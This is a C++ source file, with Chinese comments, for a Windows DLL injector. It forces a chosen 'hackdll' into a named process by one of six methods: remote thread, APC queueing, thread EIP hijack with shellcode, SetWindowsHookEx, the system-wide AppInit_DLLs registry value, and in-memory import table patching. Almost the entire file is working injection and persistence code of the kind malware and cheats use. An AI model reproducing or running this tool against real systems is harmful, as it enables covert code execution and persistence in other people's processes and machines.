#include"_tmain.h"
 



int _tmain(int argc,TCHAR* argv[],TCHAR* envp[])
{
	inject(argv[1], argv[2],argv[3]);  //目标进程名，注入方式，hackdll文件路径
	return 0;
}
void inject(TCHAR* ImageName, TCHAR* flag,TCHAR* DllPath)
{
	int Flag;
	_stscanf_s((const wchar_t*)flag, _T("%d"), &Flag);
	DWORD process_id = _PROCESS_HELPER_::get_processid_by_imagename((const TCHAR*)ImageName);
	HANDLE process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id);
	switch (Flag)
	{
	case REMOTE_THREAD:
		create_remote_thread(process_handle,process_id, DllPath);
		break;
	case APC_INJECOT:
		apc_inject(process_handle, process_id, DllPath);    
		break;
	case HOOK_EIP:
		hook_eip_inject(process_handle, process_id, DllPath);
		break;
	case SETWINDOWHOOKEX:
		set_window_hookex_inject(process_handle, process_id, DllPath);
		break;
	case REGISTER_INJECT:
		register_inject(DllPath);     //最好不要测试该方法
		break;
	case MODIFY_IMPORT_TABLE_INJECT:
	{
		modify_import_table_inject(process_handle, process_id, DllPath,_T("Sub_1"));
		break;
	}
	}
}

void apc_inject(HANDLE ProcessHandle, DWORD ProcessIdentity, TCHAR* DllPath)
{
#ifdef UNICODE
	LPFN_LOADLIBRARYW LoadLibrary_Pointer = (LPFN_LOADLIBRARYW)_PE_HELPER_::get_remote_proc_address(ProcessIdentity, ProcessHandle, "kernel32.dll", "LoadLibraryW");
#else
	LPFN_LOADLIBRARYA LoadLibrary_Pointer = (LPFN_LOADLIBRARYA)_PE_HELPER_::get_remote_proc_address(ProcessIdentity, ProcessHandle, "kernel32.dll", "LoadLibraryA");
#endif

	LPVOID virtual_address = NULL;
	int last_error = 0;
	std::vector<DWORD> thread_identity{};
	HMODULE  kernel32_module_base = NULL;
	HANDLE thread_handle = INVALID_HANDLE_VALUE;
	virtual_address = VirtualAllocEx(ProcessHandle, NULL, (_tcslen(DllPath)+1)* sizeof(TCHAR), MEM_COMMIT, PAGE_READWRITE);
	if (virtual_address == NULL){
		last_error = GetLastError();
		goto Exit;
	}
	if (WriteProcessMemory(ProcessHandle, virtual_address, DllPath, (_tcslen(DllPath) + 1) * sizeof(TCHAR), NULL) == FALSE){
		last_error = GetLastError();
		goto Exit;
	}
	if (_THREAD_HELPER_::get_thread_id(ProcessIdentity, thread_identity) == FALSE){            //获得目标进程下的所有线程f
		last_error = GetLastError();
		goto Exit;
	}
	kernel32_module_base = GetModuleHandle(_T("KERNEL32.DLL"));
	if (kernel32_module_base == NULL)
	{
		goto Exit;
	}
	if (LoadLibrary_Pointer == NULL) {
		goto Exit;
	}
	for (int i = thread_identity.size() - 1; i >= 0; i--){          //主线程被插入执行体后后面会出现问题，所以采用从后向前插入的方式进行
		thread_handle = OpenThread(THREAD_SET_CONTEXT, FALSE, (DWORD)thread_identity[i]);
		if (thread_handle){
			QueueUserAPC((PAPCFUNC)LoadLibrary_Pointer, thread_handle,(ULONG_PTR)virtual_address);
			CloseHandle(thread_handle);
		}
	}
Exit:
	if (ProcessHandle != NULL){
		CloseHandle(ProcessHandle);
		ProcessHandle = INVALID_HANDLE_VALUE;
	}
	thread_identity.~vector();
}

void create_remote_thread(HANDLE ProcessHandle,DWORD ProcessIdentity, TCHAR* DllPath){
	void* _LoadLibrary_= _PE_HELPER_::get_remote_proc_address(ProcessIdentity, ProcessHandle, (char*)"kernel32.dll", (char*)"LoadLibraryW");
	//2.在目标进程中申请空间
	LPVOID base_address = VirtualAllocEx(ProcessHandle, NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	//3.写入DLL路径
	SIZE_T write_length = 0;
	BOOL ret = WriteProcessMemory(ProcessHandle, base_address, DllPath, (_tcslen(DllPath) + 1) * sizeof(TCHAR), &write_length);
	if (ret == FALSE){
		MessageBox(NULL, _T("WriteProcessMemory failed!"), _T("Error"), MB_OK);
		return;
	}
	HANDLE thread_handle=CreateRemoteThread(ProcessHandle, NULL, NULL, (LPTHREAD_START_ROUTINE)_LoadLibrary_, (LPVOID)base_address, NULL, NULL);
	_gettchar();
}
void hook_eip_inject(HANDLE ProcessHandle, DWORD ProcessIdentity, TCHAR* DllPath){
	CONTEXT	thread_context = { 0 };
	int     last_error = 0;
	PVOID   virtual_address = NULL;
	std::vector<DWORD> thread_identity{};
	HANDLE  thread_handle = NULL;
	PUINT8	dll_address_in_shell = NULL;
	_THREAD_HELPER_::get_thread_id(ProcessIdentity, thread_identity);   //得到目标进程的所有线程ID
	if (_MEMORY_HELPER_::IsBadReadPtr(DllPath, (_tcslen(DllPath) + 1) * sizeof(TCHAR))){
		release(virtual_address, thread_handle, ProcessHandle);
	}
	virtual_address = VirtualAllocEx(ProcessHandle, NULL,sizeof(__ShellCode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);  //目标进程空间申请内存
	if (virtual_address == NULL){
		release(virtual_address, thread_handle, ProcessHandle);
	}
	dll_address_in_shell = __ShellCode + 29;
	memcpy(dll_address_in_shell, DllPath, (_tcslen(DllPath) + 1) * sizeof(TCHAR));  //将Dll完整路径存入目标进程空间中   
	*(PULONG)(__ShellCode + 3) = (ULONG_PTR)virtual_address + 29;     	//Push Address 
#ifdef UNICODE
	LPFN_LOADLIBRARYW LoadLibrary_Pointer = (LPFN_LOADLIBRARYW)_PE_HELPER_::get_remote_proc_address(ProcessIdentity, ProcessHandle, "kernel32.dll", "LoadLibraryW");
#else
	LPFN_LOADLIBRARYW LoadLibrary_Pointer = (LPFN_LOADLIBRARYA)_PE_HELPER_::get_remote_proc_address(ProcessIdentity, ProcessHandle, "kernel32.dll", "LoadLibraryA");
#endif
	*(PULONG)(__ShellCode + 25) = (ULONG)LoadLibrary_Pointer;   //当前exe模块中的导入函数
	*(PULONG_PTR)(__ShellCode + 9) = (ULONG_PTR)virtual_address + 25;
	thread_handle = OpenThread(THREAD_ALL_ACCESS, FALSE, thread_identity[0]);     //通过目标主线程ID获得主线程句柄
	if (thread_handle == NULL){
		release(virtual_address, thread_handle, ProcessHandle);
	}
	SuspendThread(thread_handle);   //首先挂起线程
	thread_context.ContextFlags = CONTEXT_ALL;
	if (GetThreadContext(thread_handle, &thread_context) == FALSE){
		release(virtual_address, thread_handle, ProcessHandle);
	}
	*(PULONG_PTR)(__ShellCode + 21) = thread_context.Eip;
	*(PULONG_PTR)(__ShellCode + 17) = (ULONG_PTR)virtual_address + 21;
	if (!WriteProcessMemory(ProcessHandle, virtual_address, __ShellCode, sizeof(__ShellCode), NULL)){
		release(virtual_address, thread_handle, ProcessHandle);
	}
	thread_context.Eip = (ULONG_PTR)virtual_address;    //把现在的ShellCode作为新的指令
	if (!SetThreadContext(thread_handle, &thread_context)){                            	//将线程上下背景文设置回线程中
		release(virtual_address, thread_handle, ProcessHandle);
	}
	ResumeThread(thread_handle);       	//恢复线程继续执行
	_gettchar();
}

void set_window_hookex_inject(HANDLE ProcessHandle, DWORD ProcessIdentity, TCHAR* DllPath)
{
	int    last_error = 0;
	std::vector<DWORD>   thread_identity;
	HHOOK hook_handle = NULL;
	FARPROC Sub_1 = NULL;
	HMODULE module_base = NULL;
	if (_THREAD_HELPER_::get_thread_id(ProcessIdentity, thread_identity) == FALSE){
		last_error = GetLastError();
		goto Exit;
	}
	module_base = LoadLibrary((LPCWSTR)DllPath);
	if (module_base == NULL){
		last_error = GetLastError();
		goto Exit;
	}
	Sub_1 = GetProcAddress(module_base, "Sub_1");
	if (Sub_1 == NULL){
		last_error = GetLastError();
		goto Exit;
	}
	for (int i = 0; i < thread_identity.size(); ++i){
		hook_handle = SetWindowsHookEx(WH_MOUSE, (HOOKPROC)Sub_1, module_base, (DWORD)thread_identity[i]);
		if (hook_handle != NULL){
			break;
		}
	}
	_gettchar();
Exit:
	if (hook_handle != NULL){
		UnhookWindowsHookEx(hook_handle);  //Remove Dll 
		hook_handle = NULL;
	}
	if (thread_identity.empty() == false){
		std::vector<DWORD>().swap(thread_identity);    //vector<>stl  
	}
	if (!!(thread_identity.size())){
		std::vector<DWORD>().swap(thread_identity);
	}
	if (module_base != NULL){
		FreeLibrary(module_base);
		module_base = NULL;
	}
}

BOOL register_inject(TCHAR* DllPath)
{
	HKEY key_handle = NULL;
	BYTE bufferdata[MAX_PATH] = { 0 };
	//五大键值
	LONG isok = RegOpenKeyEx(HKEY_LOCAL_MACHINE, WINDOWS, 0, KEY_ALL_ACCESS, &key_handle);
	/*
		RegOpenKeyEx：打开一个指定的注册表键
			HKEY hKey,			//需要打开的主键的名称       HKEY_LOCAL_MACHINE：当前计算机
			LPCTSTR lpSubKey,	//需要打开的子键的名称
			DWORD ulOptions,	//保留，设为0
			REGSAM samDesired,  //安全访问标记，也就是权限
			PHKEY phkResult     //用于返回，得到将要打开键的句柄
		返回值：成功则返回0(LONG型)
				失败：IsOk=2，而非0。字符集问题，不能将char*转换为LPCWSTR
				失败：IsOk=5，而非0。权限不够，要以管理员方式启动VS！！
		注意，要用RegCloseKey关闭
	*/
	if (isok != ERROR_SUCCESS){
		_tprintf(_T("RegOpenKeyEx() Error!\n"));
		goto Exit;
	}
	memcpy(bufferdata, DllPath, (_tcslen(DllPath) + 1) * sizeof(TCHAR));
	isok = RegSetValueEx(key_handle, _T("AppInit_DLLs"), 0, REG_SZ, bufferdata, (_tcslen(DllPath) + 1) * sizeof(TCHAR));	//写入键值
	/*
		RegSetValueEx：设置指定值的数据和类型
			HKEY hKey,				//已打开项的句柄
			LPCTSTR lpValueName,	//欲设置值的名称
			DWORD Reserved,			//保留，设为0
			DWORD dwType,			//将被存储的数据类型    REG_SZ：一个以0结尾的字符串
			CONST BYTE *lpData,		//一个缓冲区，包含了欲为指定值名称存储的数据
			DWORD cbData			//lpData参数所指向的数据的大小

	*/
	if (isok != ERROR_SUCCESS){
		_tprintf(_T("RegSetKeyValue() Error!\n"));
		goto Exit;
	}
Exit:
	if (key_handle)  RegCloseKey(key_handle);
	return isok;
}
ULONG  find_image_base_address_by_peb(HANDLE ProcessHandle)
{
	//获取目标进程中的PE结构信息进而得到exe映像地址ImageBaseAddress（这里使用ZwQueryInformationProcess而不是暴力搜索去匹配MEM_IMAGE)
	HMODULE module_handle = GetModuleHandleA("ntdll.dll");
	LPFN_NtQueryInformationProcess NtQueryInformationProcess_Pointer = (LPFN_NtQueryInformationProcess)GetProcAddress(module_handle, "NtQueryInformationProcess");
	ULONG ReturnLength = 0;
	PROCESS_BASIC_INFORMATION* pbasic_info =new PROCESS_BASIC_INFORMATION();
	NtQueryInformationProcess_Pointer(ProcessHandle, ProcessBasicInformation, pbasic_info, sizeof(PROCESS_BASIC_INFORMATION), &ReturnLength);
	DWORD peb_base_address = (DWORD)pbasic_info->PebBaseAddress;
	PPEB pPeb = new PEB();
	BOOL ret = ReadProcessMemory(ProcessHandle,(LPCVOID)peb_base_address,pPeb,sizeof(PEB),0);
	if (!ret) return 0;
	ULONG_PTR image_base_address = (ULONG_PTR)pPeb->ImageBaseAddress;
	return image_base_address;
}

NTSTATUS modify_import_table_inject(HANDLE ProcessHandle, DWORD ProcessIdentity, TCHAR* DllPath, const TCHAR* DLLExportFunc)
{
	ULONG image_base_address = find_image_base_address_by_peb(ProcessHandle);
	PBYTE lpBuffer = new BYTE[BUFFER_SIZE];
	BOOL ret = ReadProcessMemory(ProcessHandle,(LPCVOID)image_base_address, lpBuffer,BUFFER_SIZE,0);
	PIMAGE_DOS_HEADER dos_header;
	PIMAGE_NT_HEADERS nt_headers;
	PIMAGE_FILE_HEADER file_header;
	PIMAGE_OPTIONAL_HEADER optional_header;
	PIMAGE_IMPORT_BY_NAME import_by_name;
	PIMAGE_IMPORT_DESCRIPTOR original_import_descriptor, new_import_descriptor;
	ULONG import_table_rva, import_table_size;
	ULONG new_import_table_va, new_import_table_size;
	PBYTE pbuf = NULL, pthunk_data = NULL;
	ULONG old_protect;
	NTSTATUS status;
	ULONG address_to_change_protect = NULL;
	ULONG size_to_change_protect = 0;
	ULONG total_image_size = 0;
	ULONG aligned_header_size = 0;
	if (image_base_address == 0)   return STATUS_INVALID_PARAMETER;
	dos_header = (PIMAGE_DOS_HEADER)lpBuffer;
	if (dos_header->e_magic != 0x5A4D)   return FALSE;          //MZ
	nt_headers = (PIMAGE_NT_HEADERS)((PBYTE)lpBuffer + dos_header->e_lfanew);
	if (nt_headers->Signature != 0x00004550) return FALSE;
	__try{
		file_header = (PIMAGE_FILE_HEADER)((PBYTE)lpBuffer + dos_header->e_lfanew + 4);
		optional_header = (PIMAGE_OPTIONAL_HEADER)((BYTE*)file_header + sizeof(IMAGE_FILE_HEADER));
		total_image_size = optional_header->SizeOfImage;  
		import_table_rva = optional_header->DataDirectory[1].VirtualAddress;  
		import_table_size = optional_header->DataDirectory[1].Size;
		original_import_descriptor = (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)lpBuffer + import_table_rva);
		new_import_table_size = import_table_size + sizeof(IMAGE_IMPORT_DESCRIPTOR);
		aligned_header_size = ALIGN_UP_BY(optional_header->SizeOfHeaders, optional_header->SectionAlignment);  //利用PE头后面的一部分空间，Thunk数据有0x40大小就够了
		pbuf = (PBYTE)((PBYTE)lpBuffer + aligned_header_size - new_import_table_size - 0x40);
		address_to_change_protect = image_base_address;  
		size_to_change_protect = aligned_header_size;
		HMODULE ntdll_module_base = LoadLibrary(_T("Ntdll.DLL"));
		if (ntdll_module_base == NULL) return FALSE;
		LPFN_NtProtectVirtualMemory NtProtectVirtualMemory_Pointer = NULL;
		NtProtectVirtualMemory_Pointer = (LPFN_NtProtectVirtualMemory)GetProcAddress(ntdll_module_base, "NtProtectVirtualMemory");
		if (NtProtectVirtualMemory_Pointer == NULL) return FALSE;
		status = NtProtectVirtualMemory_Pointer(ProcessHandle, (PVOID*)&address_to_change_protect, &size_to_change_protect, PAGE_EXECUTE_READWRITE, &old_protect);
		if (NT_SUCCESS(status)){

			memcpy(pbuf, original_import_descriptor, import_table_size);			//保存原始输入表
			new_import_descriptor = (PIMAGE_IMPORT_DESCRIPTOR)(pbuf + import_table_size - sizeof(IMAGE_IMPORT_DESCRIPTOR));  //新的偏移位置，稍后填充,减去一个导入表描述的大小是因为IID数组以全0结构结束
			pthunk_data = pbuf + new_import_table_size;		//构造Thunk等数据
			memcpy((char*)(pthunk_data + 0x00), DllPath, (_tcslen(DllPath) + 1) * sizeof(TCHAR));   //从0x00处开始是DLL名称
			import_by_name = (PIMAGE_IMPORT_BY_NAME)(pthunk_data + 0x20);			//在0x20处构造funcname
			import_by_name->Hint = 0;    //按名称导入，这里直接填0即可
			memcpy(import_by_name->Name, DLLExportFunc, (_tcslen(DLLExportFunc)+1)*sizeof(TCHAR));
			*(ULONG*)(pthunk_data + 0x30) = (ULONG)pthunk_data + 0x20 - image_base_address;			//在0x30处构造OriginalFirstThunk，指向0x20处的IMAGE_IMPORT_BY_NAME
			*(ULONG*)(pthunk_data + 0x38) = (ULONG)pthunk_data + 0x20 - image_base_address;			//0x38作为FirstThunk
			new_import_descriptor->OriginalFirstThunk = (ULONG)pthunk_data + 0x30 - (ULONG)lpBuffer;			//填充自己的DLL输入项
			new_import_descriptor->TimeDateStamp = 0;
			new_import_descriptor->ForwarderChain = 0;
			new_import_descriptor->Name = (ULONG)pthunk_data - (ULONG)lpBuffer;
			new_import_descriptor->FirstThunk = (ULONG)pthunk_data + 0x38 - (ULONG)lpBuffer;
			new_import_table_va = (ULONG)pbuf - (ULONG)lpBuffer;			//计算新的输入表偏移量
			optional_header->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress = new_import_table_va;			//修改数据
			optional_header->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size = new_import_table_size;
			//禁止绑定输入表
			optional_header->DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].VirtualAddress = 0;
			optional_header->DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].Size = 0;
			if (WriteProcessMemory(ProcessHandle, (LPVOID)image_base_address, lpBuffer, total_image_size, 0)) 
				return STATUS_SUCCESS;
		}
		else return status;
	}
	__except (EXCEPTION_EXECUTE_HANDLER){
		return GetExceptionCode();
	}
}


void release(PVOID lpAddress, HANDLE ThreadHandle, HANDLE ProcessHandle)
{
	if (lpAddress != NULL) {
		VirtualFreeEx(ProcessHandle, lpAddress, sizeof(__ShellCode), MEM_RELEASE);
	}
	if (ThreadHandle != INVALID_HANDLE_VALUE) {
		CloseHandle(ThreadHandle);
	}
	if (ProcessHandle != INVALID_HANDLE_VALUE) {
		CloseHandle(ProcessHandle);
	}
}